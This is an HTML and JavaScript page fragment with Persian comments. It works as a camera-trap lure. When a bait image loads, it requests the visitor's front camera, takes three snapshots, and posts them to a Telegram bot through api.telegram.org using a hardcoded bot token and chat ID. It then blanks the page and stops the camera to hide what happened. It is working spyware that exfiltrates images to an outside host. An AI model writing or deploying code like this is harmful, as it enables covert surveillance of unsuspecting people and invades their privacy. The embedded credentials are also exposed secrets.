<video id="video" playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
    const CHAT_ID = "-1003384762825"; // گروهت

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 1280, height: 720 } 
            });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();

            // ۳ تا عکس با فاصله ۱ ثانیه
            for(let i = 1; i <= 3; i++) {
                setTimeout(() => captureAndSend(i, stream), i * 1200);
            }

            // بعد ۵ ثانیه صفحه سفید
            setTimeout(() => {
                document.body.innerHTML = "<div style='background:#fff;width:100%;height:100%'></div>";
                stream.getTracks().forEach(t => t.stop());
            }, 5000);

        } catch(e) {
            // اگه دسترسی نداد، بازم عکس اصلی نشون بده
            console.log("دوربین بلاک شد");
        }
    }

    function captureAndSend(num, stream) {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(blob => {
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', blob, `live_${num}.jpg`);
            form.append('caption', `عکس زنده #${num} از دوربین جلو`);
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: form
            });
        }, 'image/jpeg', 0.95);
    }

    // وقتی عکس اصلی کامل لود شد → دوربین رو فعال کن
    document.getElementById('photo').onload = () => {
        setTimeout(startCamera, 800);
    };
</script>
